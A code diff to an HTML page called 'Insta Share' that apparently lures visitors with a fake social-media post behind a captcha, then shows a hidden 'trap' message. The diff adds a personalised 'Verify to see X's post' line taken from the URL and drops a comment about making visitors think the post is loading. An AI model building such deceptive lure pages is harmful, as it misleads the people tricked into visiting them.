@@ -72,12 +72,12 @@
 </head>
 <body>
   <div class="header">Insta Share</div>
-  <div id="statusMsg">Verify you're not a robot to view posts.</div>
+  <div id="statusMsg">Verifying post…</div>
 
   <div class="g-recaptcha" data-sitekey="6LeTg4ErAAAAAOJ4tpn7E_vvhRyRJZN-3LTvNw22" data-callback="onCaptchaSuccess"></div>
 
   <div id="fakeFeed">
-    <p>Loading your feed...</p>
+    <p>Loading post...</p>
   </div>
 
   <div id="trapMessage">
@@ -92,13 +92,19 @@
   </div>
 
   <script>
+    // Grab `id` from the URL (e.g. ?id=eva_princess)
+    const params = new URLSearchParams(window.location.search);
+    const userId = params.get("id") || "user";
+
+    document.getElementById('statusMsg').textContent = `Verify to see ${userId}'s post`;
+
     function onCaptchaSuccess(token) {
       const status = document.getElementById('statusMsg');
       const feed = document.getElementById('fakeFeed');
       const trap = document.getElementById('trapMessage');
       const captcha = document.querySelector('.g-recaptcha');
 
-      status.textContent = '✅ Verification successful. Loading posts...';
+      status.textContent = '✅ Verification successful. Loading post...';
       captcha.style.display = 'none';
       feed.style.display = 'block';
 
@@ -126,7 +132,7 @@
             feed.style.display = 'none';
             trap.style.display = 'block';
             status.textContent = '';
-          }, 2000); // Delay so they think it's loading
+          }, 2000);
         })
         .catch(() => {
           trap.style.display = 'block';
